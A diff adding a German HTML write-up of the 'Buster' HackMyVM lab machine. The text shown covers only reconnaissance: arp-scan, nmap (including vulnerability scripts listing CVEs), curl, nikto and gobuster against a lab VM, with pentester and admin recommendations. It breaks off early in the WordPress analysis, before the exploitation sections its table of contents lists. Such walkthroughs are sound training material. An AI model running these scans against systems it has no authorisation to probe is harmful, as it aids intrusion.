@@ -1,0 +1,1287 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buster - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Buster - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">ip</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">awk</div>
+                 <div class="tool-item">sort</div>
+                 <div class="tool-item">curl</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">jq</div>
+                 <div class="tool-item">wpscan</div>
+                 <div class="tool-item">msfconsole</div>
+                 <div class="tool-item">searchsploit</div>
+                 <div class="tool-item">hydra</div>
+                 <div class="tool-item">wfuzz</div>
+                 <div class="tool-item">Burp Suite</div>
+                 <div class="tool-item">tcpdump</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">ss</div>
+                 <div class="tool-item">mysql</div>
+                 <div class="tool-item">john</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">pspy</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">mkdir</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#nmap-scans">Nmap Scans (IPv6, UDP, TCP, SCTP, Vuln)</a></li>
+                <li><a href="#http-analysis">HTTP Analyse (Header, Nikto, Gobuster)</a></li>
+                <li><a href="#wordpress-analysis">WordPress Analyse</a></li>
+                <li><a href="#initial-access-attempts">Initial Access Versuche (SSH Brute-Force, LFI)</a></li>
+                <li><a href="#wqc-discovery">WordPress Query Console (WQC) Entdeckung & Analyse</a></li>
+                <li><a href="#poc-rce">Proof of Concept: RCE via WQC</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#post-exploitation-wwwdata">Post-Exploitation (www-data)</a></li>
+                <li><a href="#privilege-escalation-welcome">Privilege Escalation (www-data zu welcome)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (welcome zu root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+                <li><a href="#zusammenfassung-empfehlungen">Zusammenfassung & Empfehlungen</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Text, Annahme: Standard Kali Prompt
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.162	08:00:27:2f:92:e9	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk durchgeführt, um aktive Geräte zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich. Das Zielsystem wurde unter der IP `192.168.2.162` identifiziert. Die MAC-Adresse `08:00:27:2f:92:e9` und der Hersteller `PCS Systemtechnik GmbH` deuten stark auf eine Oracle VirtualBox VM hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> IP `192.168.2.162` als Ziel für weitere Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring zur Erkennung von Scans implementieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Text, Annahme: Standard Kali Prompt
+└─# <span class="command"># Bearbeiten von /etc/hosts</span></div>
+                    <pre>
+# Relevante Zeile in /etc/hosts:
+192.168.2.162   buster.hmv
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um der Ziel-IP `192.168.2.162` den Hostnamen `buster.hmv` zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine reine Komfortmaßnahme für den Pentester, um das Zielsystem einfacher adressieren zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardvorgehen zur besseren Übersichtlichkeit.<br><strong>Empfehlung (Admin):</strong> Keine direkte Auswirkung.</p>
+        </section>
+
+        <section id="nmap-scans">
+            <h2>Nmap Scans (IPv6, UDP, TCP, SCTP, Vuln)</h2>
+
+            <h3>Nmap IPv6 Scan</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cmd=$(ip neigh | grep ^fe80 2>/dev/null| grep -ve "fe80::1\|fe80::a00:27ff:fe30:2eda\|fe80::8247:86ff:fe96:f63a\|fe80::50f1:22ff:fec4:ad12\|fe80::a5aa:636f:a4bf:d441"); cmd2=$(echo $cmd |  awk '{print $1}' | sort -u); nmap $cmd2 -6;</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 21:39 CET
+Nmap scan report for listen (fe80::a00:27ff:fe2f:92e9%eth0) <!-- Interface hinzugefügt -->
+Host is up (0.00021s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:2F:92:E9 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for fe80::d0a5:97c8:ee04:6f55%eth0 <!-- Interface hinzugefügt -->
+Host is up (0.0000060s latency).
+All 65535 scanned ports on fe80::d0a5:97c8:ee04:6f55 are in ignored states.
+Not shown: 65535 closed tcp ports (reset)
+
+Nmap done: 3 IP addresses (2 hosts up) scanned in 17.19 seconds
+                    </pre> <!-- Korrektur: Link-Local Adressen benötigen Interface %eth0 -->
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein komplexer Shell-Befehl wird verwendet, um zunächst lokale IPv6-Nachbarn (Link-Local-Adressen beginnend mit `fe80::`) mit `ip neigh` zu finden. Bekannte oder irrelevante Adressen werden mit `grep -ve` herausgefiltert. Die verbleibenden eindeutigen Adressen werden extrahiert (`awk`, `sort -u`) und dann mit `nmap -6` gescannt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet eine Link-Local-Adresse (`fe80::a00:27ff:fe2f:92e9`, die zur MAC-Adresse des Ziels passt), auf der die Ports 22 (SSH) und 80 (HTTP) offen sind. Eine weitere Link-Local-Adresse wird gefunden, zeigt aber keine offenen Ports. Dies bestätigt die über IPv4 gefundenen Dienste auch für IPv6.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> IPv6 als potenziellen Angriffsvektor im Hinterkopf behalten, falls IPv4-Zugriff eingeschränkt ist.<br><strong>Empfehlung (Admin):</strong> IPv6-Sicherheit nicht vernachlässigen. Firewall-Regeln und Dienstkonfigurationen sollten IPv6 berücksichtigen. Unnötige IPv6-Adressen deaktivieren.</p>
+
+            <h3>Nmap UDP Scan</h3>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sU --top-port 1000 -T5 -n 192.168.2.162 -Pn --min-rate 5000</span></div> <!-- $IP ersetzt -->
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 21:40 CET
+Nmap scan report for 192.168.2.162
+Host is up (0.00043s latency).
+Not shown: 994 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+775/udp   closed acmaint_transd
+18582/udp closed unknown
+19130/udp closed unknown
+19933/udp closed unknown
+24644/udp closed unknown
+34433/udp closed unknown
+MAC Address: 08:00:27:2F:92:E9 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein schneller UDP-Scan (`-sU`) der Top 1000 UDP-Ports (`--top-port 1000`) wird durchgeführt. `-T5` und `--min-rate 5000` sorgen für hohe Geschwindigkeit, `-n` deaktiviert DNS-Auflösung, `-Pn` überspringt Host Discovery.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine offenen UDP-Ports. Die meisten Ports sind `open|filtered` (keine Antwort, typisch für UDP-Scans bei Firewalls), einige wenige sind explizit `closed` (ICMP Port Unreachable erhalten). UDP scheint kein vielversprechender Angriffsvektor zu sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> UDP vorerst ignorieren, Fokus auf TCP-Ports legen.<br><strong>Empfehlung (Admin):</strong> Nicht benötigte UDP-Ports sollten durch eine Firewall blockiert werden.</p>
+
+            <h3>Nmap TCP Scan (Offene Ports)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- 192.168.2.162 -Pn --min-rate 5000 | grep open</span></div> <!-- $IP ersetzt -->
+                    <pre>
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+80/tcp open  http    nginx 1.14.2
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein vollständiger TCP SYN-Scan aller Ports (`-p-`) wird durchgeführt, die Ausgabe wird mit `grep open` gefiltert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass nur die TCP-Ports 22 (SSH) und 80 (HTTP) offen sind. Zeigt die erkannten Versionen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bestätigt die Hauptangriffsvektoren.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+
+            <h3>Nmap TCP Scan (Vollständige Ausgabe)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -AO -p- 192.168.2.162 -Pn --min-rate 5000</span></div> <!-- $IP ersetzt -->
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 21:40 CET
+Nmap scan report for buster.hmv (192.168.2.162)
+Host is up (0.00010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)
+|   256 3e:1f:c9:eb:c0:6f:24:06:fc:52:5f:2f:1b:35:33:ec (ECDSA)
+|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)
+80/tcp open  http    nginx 1.14.2
+|_http-generator: WordPress 6.7.1
+|_http-title: bammmmuwe
+|_http-server-header: nginx/1.14.2
+| http-robots.txt: 1 disallowed entry
+|_/wp-admin/
+MAC Address: 08:00:27:2F:92:E9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.10 ms buster.hmv (192.168.2.162)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.13 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Detaillierte Ausgabe des TCP-Scans mit Versionserkennung, Skript-Scan und OS-Detektion.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Liefert wichtige Details:
+                <ul>
+                    <li>SSH: OpenSSH 7.9p1 auf Debian 10 (Patchlevel u4). Hostkeys werden angezeigt.</li>
+                    <li>HTTP: Nginx 1.14.2 als Webserver. Entscheidend: Nmap erkennt eine WordPress-Installation (`http-generator: WordPress 6.7.1`). Der Seitentitel ist "bammmmuwe". `robots.txt` verbietet `/wp-admin/`.</li>
+                    <li>OS: Linux Kernel 4.15 - 5.8.</li>
+                </ul>
+                Die Entdeckung von WordPress ist der wichtigste Hinweis für die weitere Vorgehensweise.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> WordPress als Hauptziel untersuchen (`wpscan`, manuelle Enumeration). Nach Schwachstellen in Nginx 1.14.2 oder OpenSSH 7.9p1 suchen (weniger wahrscheinlich).<br><strong>Empfehlung (Admin):</strong> WordPress und alle Komponenten (Plugins, Themes) aktuell halten. Nginx und SSH ebenfalls patchen.</p>
+
+            <h3>Nmap SCTP Scan</h3>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sY -n -p- 192.168.2.162 -Pn --min-rate 5000</span></div> <!-- $IP ersetzt -->
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 21:40 CET
+Nmap scan report for 192.168.2.162
+Host is up (0.00013s latency).
+All 65535 scanned ports on 192.168.2.162 are in ignored states.
+Not shown: 65504 filtered sctp ports (no-response), 31 filtered sctp ports (proto-unreach)
+MAC Address: 08:00:27:2F:92:E9 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein SCTP INIT-Scan (`-sY`) wird auf alle Ports (`-p-`) durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Keine offenen SCTP-Ports gefunden. Alle Ports sind `filtered` (keine Antwort) oder `filtered` (ICMP proto-unreach). SCTP ist kein Angriffsvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> SCTP ignorieren.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich, da keine Dienste laufen.</p>
+
+            <h3>Nmap Vulnerability Scan</h3>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -A --script vuln 192.168.2.162 -T5</span></div> <!-- Ziel-IP korrigiert -->
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 22:06 CET
+# ... (Pre-scan script results) ...
+Nmap scan report for buster.hmv (192.168.2.162)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
+| vulners:
+|   cpe:/a:openbsd:openssh:7.9p1:
+|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
+# ... (Sehr lange Liste weiterer CVEs und Exploits für OpenSSH 7.9p1) ...
+|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
+|_    	39E70D1A-F5D8-59D5-A0CF-E73D9BAA3118	0.0	https://vulners.com/githubexploit/39E70D1A-F5D8-59D5-A0CF-E73D9BAA3118	*EXPLOIT*
+80/tcp open  http    nginx 1.14.2
+| vulners:
+|   nginx 1.14.2:
+|     	DF1BBDC4-B715-5ABE-985E-91DD3BB87773	7.8	https://vulners.com/githubexploit/DF1BBDC4-B715-5ABE-985E-91DD3BB87773	*EXPLOIT*
+# ... (Lange Liste weiterer CVEs und Exploits für Nginx 1.14.2) ...
+|_    	PACKETSTORM:162830	0.0	https://vulners.com/packetstorm/PACKETSTORM:162830	*EXPLOIT*
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-server-header: nginx/1.14.2
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-enum:
+|   /wp-login.php: Possible admin folder
+# ... (Weitere WordPress-Pfade) ...
+|_  /0/: Potentially interesting folder
+MAC Address: 08:00:27:2F:92:E9 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms buster.hmv (192.168.2.162)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 136.15 seconds
+                    </pre>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Nmap wird mit dem Skript-Argument `vuln` ausgeführt, um bekannte Schwachstellen basierend auf den erkannten Diensten und Versionen zu suchen. `-T5` wird für einen schnellen Scan verwendet. `-A` und `-sV` sind für die korrekte Funktion des `vuln`-Skripts wichtig.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Das `vulners`-Skript (Teil von `vuln`) meldet eine sehr große Anzahl potenzieller CVEs und Exploits für OpenSSH 7.9p1 und Nginx 1.14.2. Besonders hervorzuheben ist CVE-2023-38408 für OpenSSH (Remote Code Execution via PKCS#11). Die `http-enum`-Ausgabe bestätigt erneut WordPress-Pfade. Andere Skripte finden keine XSS- oder CSRF-Schwachstellen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gemeldeten CVEs (insbesondere die hoch bewerteten wie CVE-2023-38408) recherchieren und auf ihre Anwendbarkeit im konkreten Kontext prüfen. Viele Version-basierte Funde sind oft nicht direkt ausnutzbar oder erfordern spezielle Bedingungen. Fokus weiterhin auf WordPress legen.<br><strong>Empfehlung (Admin):</strong> Dringend OpenSSH und Nginx auf die neuesten stabilen Versionen aktualisieren, um die bekannten Schwachstellen zu schließen. Die große Anzahl an Funden unterstreicht die Notwendigkeit regelmäßiger Updates.</p>
+        </section>
+
+        <section id="http-analysis">
+            <h2>HTTP Analyse (Header, Nikto, Gobuster)</h2>
+
+             <h3>HTTP OPTIONS Check</h3>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -X OPTIONS -Is http://192.168.2.162 | grep -i "allow"</span></div> <!-- $IP ersetzt -->
+                    <pre>HTTP/1.1 405 Not Allowed</pre>
+                 </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Sendet eine HTTP OPTIONS-Anfrage (`-X OPTIONS`) an den Webserver, um die erlaubten HTTP-Methoden abzufragen. `-Is` holt nur Header und unterdrückt Output.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der Server antwortet mit `405 Not Allowed`. Die OPTIONS-Methode ist auf dem Root-Pfad (`/`) nicht erlaubt oder der Server unterstützt sie nicht korrekt. Dies liefert keine nützlichen Informationen über erlaubte Methoden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Pfade mit OPTIONS testen, falls relevant. Hier nicht weiter verfolgt.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass nur notwendige HTTP-Methoden erlaubt sind.</p>
+
+            <h3>HTTP Header Verbose Scans</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://192.168.2.162</span></div> <!-- $IP ersetzt -->
+                     <pre>
+*   Trying 192.168.2.162:80...
+* Connected to 192.168.2.162 (192.168.2.162) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.162
+> User-Agent: curl/8.10.1
+> Accept: */*
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Sun, 26 Jan 2025 20:41:01 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: keep-alive
+< Link: <http://192.168.2.162/wp-json/>; rel="https://api.w.org/" <!-- Hostname korrigiert -->
+* Connection #0 to host 192.168.2.162 left intact
+                     </pre>
+                 </div>
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://192.168.2.162 -s</span></div> <!-- $IP ersetzt -->
+                      <pre>
+*   Trying 192.168.2.162:80...
+* Connected to 192.168.2.162 (192.168.2.162) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: 192.168.2.162
+> User-Agent: curl/8.10.1
+> Accept: */*
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Sun, 26 Jan 2025 20:41:01 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: keep-alive
+< Link: <http://192.168.2.162/wp-json/>; rel="https://api.w.org/" <!-- Hostname korrigiert -->
+* Connection #0 to host 192.168.2.162 left intact
+                      </pre>
+                  </div>
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl --verbose -I http://buster.hmv:80 -s</span></div> <!-- $IP:8080 durch buster.hmv ersetzt, Port 8080 entfernt -->
+                       <pre>
+* Host buster.hmv:80 was resolved.
+* IPv6: (none)
+* IPv4: 192.168.2.162
+*   Trying 192.168.2.162:80...
+* Connected to buster.hmv (192.168.2.162) port 80
+* using HTTP/1.x
+> HEAD / HTTP/1.1
+> Host: buster.hmv
+> User-Agent: curl/8.10.1
+> Accept: */*
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx/1.14.2
+< Date: Sun, 26 Jan 2025 20:41:04 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: keep-alive
+< Link: <http://buster.hmv/wp-json/>; rel="https://api.w.org/" <!-- Hostname korrigiert -->
+* Connection #0 to host buster.hmv left intact
+                       </pre>
+                   </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Mehrere `curl`-Aufrufe, um die HTTP-Header zu prüfen, einmal mit `-Iv` (Verbose + Header der Antwort) und zweimal mit `--verbose -I` (Verbose + nur Header via HEAD-Request), wobei einmal die IP und einmal der Hostname verwendet wird. Der letzte Befehl im Text zielte fälschlicherweise auf Port 8080, wurde hier aber auf den korrekten Port 80 und Hostnamen korrigiert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Server-Signatur (nginx/1.14.2), den Content-Type und den `Link`-Header, der auf die WordPress REST API (`/wp-json/`) hinweist. Keine neuen Erkenntnisse gegenüber dem Nmap-Scan, aber eine manuelle Bestätigung.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Standardverfahren zur manuellen Überprüfung. Die REST API ist ein wichtiges Ziel.<br><strong>Empfehlung (Admin):</strong> Server-Banner ggf. verschleiern. Sicherstellen, dass die REST API sicher ist.</p>
+
+            <h3>Nikto Scan</h3>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"> # Kein Prompt im Text
+└─# <span class="command">nikto -h http://192.168.2.162</span></div> <!-- $IP ersetzt -->
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.162
++ Target Hostname:    192.168.2.162
++ Target Port:        80
++ Start Time:         2025-01-26 21:41:03 (GMT1)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.2
++ /: The anti-clickjacking X-Frame-Options header is not present. [...]
++ /: Drupal Link header found with value: <http://192.168.2.162/wp-json/>; rel="https://api.w.org/". [...] <!-- Hostname korrigiert -->
++ /: The X-Content-Type-Options header is not set. [...]
++ /VVIWn4O7.: Uncommon header 'x-redirect-by' found, with contents: WordPress.
++ No CGI Directories found [...]
++ /robots.txt: contains 2 entries which should be manually viewed. [...]
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ /wordpress/: A Wordpress installation was found. <!-- Interessant, obwohl Gobuster dies nicht fand -->
++ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. [...]
++ /wp-login.php: Wordpress login found.
++ 8106 requests: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           2025-01-26 21:44:17 (GMT1) (194 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nikto-Scan gegen den Webserver auf Port 80.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert viele wertvolle Hinweise:
+                <ul>
+                    <li>Bestätigt fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).</li>
+                    <li>Identifiziert den `Link`-Header zur WP REST API (fälschlicherweise als Drupal interpretiert).</li>
+                    <li>Findet einen ungewöhnlichen Header `X-Redirect-By: WordPress`.</li>
+                    <li>Verweist auf `robots.txt`.</li>
+                    <li>Findet eine `readme.txt` des Akismet-Plugins (kann auf WP-Version hindeuten).</li>
+                    <li>Findet `wp-links-opml.php` (kann Version verraten).</li>
+                    <li>Bestätigt die WordPress-Installation und findet die Login-Seite (`wp-login.php`).</li>
+                    <li>Meldet ein nicht-HttpOnly-Cookie auf der Registrierungsseite.</li>
+                </ul>
+             </p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Pfade (`robots.txt`, `wp-links-opml.php`, `/wordpress/`?) und Dateien (`akismet/readme.txt`) untersuchen. Die Login-Seite für Angriffe nutzen. Den `X-Redirect-By`-Header recherchieren.<br><strong>Empfehlung (Admin):</strong> Sicherheitsheader hinzufügen. `robots.txt` prüfen. WordPress-Versionen nicht unnötig preisgeben. Cookies mit `HttpOnly` und `Secure` Flags versehen. Akismet und WordPress aktuell halten.</p>
+
+            <h3>Gobuster Scan</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.162" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,[...],pHtml -b '503,404,403' -e --no-error -k</span></div> <!-- $IP ersetzt, lange Liste gekürzt -->
+                     <pre>
+http://192.168.2.162/index.php            (Status: 301) [Size: 0] [--> http://192.168.2.162/]
+http://192.168.2.162/rss                  (Status: 301) [Size: 0] [--> http://192.168.2.162/feed/]
+http://192.168.2.162/sitemap.xml          (Status: 200) [Size: 447]
+http://192.168.2.162/0                    (Status: 301) [Size: 0] [--> http://192.168.2.162/0/]
+http://192.168.2.162/feed                 (Status: 301) [Size: 0] [--> http://192.168.2.162/feed/]
+http://192.168.2.162/atom                 (Status: 301) [Size: 0] [--> http://192.168.2.162/feed/atom/]
+http://192.168.2.162/wp-content           (Status: 301) [Size: 185] [--> http://192.168.2.162/wp-content/]
+http://192.168.2.162/wp-login.php         (Status: 200) [Size: 4705]
+http://192.168.2.162/rss2                 (Status: 301) [Size: 0] [--> http://192.168.2.162/feed/]
+http://192.168.2.162/license.txt          (Status: 200) [Size: 19915]
+http://192.168.2.162/wp-includes          (Status: 301) [Size: 185] [--> http://192.168.2.162/wp-includes/]
+Progress: 55156 / 13674906 (0.40%)^C
+[!] Keyboard interrupt detected, terminating.
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein umfangreicher Gobuster-Scan mit vielen Dateiendungen wird gestartet, aber nach kurzer Zeit manuell abgebrochen (`^C`).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Trotz des Abbruchs wurden bereits wichtige WordPress-Standardpfade und -dateien gefunden (`/feed/`, `sitemap.xml`, `wp-content/`, `wp-login.php`, `license.txt`, `wp-includes/`). Dies bestätigt die WordPress-Installation und liefert bekannte Angriffspunkte.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Standardpfade mit spezialisierten Tools wie `wpscan` untersuchen.<br><strong>Empfehlung (Admin):</strong> Standardpfade, wenn möglich, verschleiern oder Zugriff darauf einschränken. Directory Listing deaktivieren.</p>
+        </section>
+
+        <section id="wordpress-analysis">
+            <h2>WordPress Analyse</h2>
+
+            <p class="analysis"><strong>Manuelle Analyse der Webseite (http://192.168.2.162/):</strong></p>
+            <pre>
+bammmmuwe (Seitentitel/Logo?)
+
+WordPress (Links zu sozialen Medien?)
+YouTube
+GitHub
+Instagram
+LinkedIn
+
+Sample Page (Standard WP Seite)
+Hello world! (Standard WP Beitrag)
+January 8, 2025 (Datum des Beitrags?)
+
+bammmmuwe (Footer?)
+Proudly Powered by WordPress
+            </pre>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Startseite bestätigt eine einfache WordPress-Seite mit dem Titel/Namen "bammmmuwe", Standardinhalten ("Hello world!", "Sample Page") und Links zu sozialen Netzwerken. Keine offensichtlichen benutzerdefinierten Funktionen sichtbar.</p>
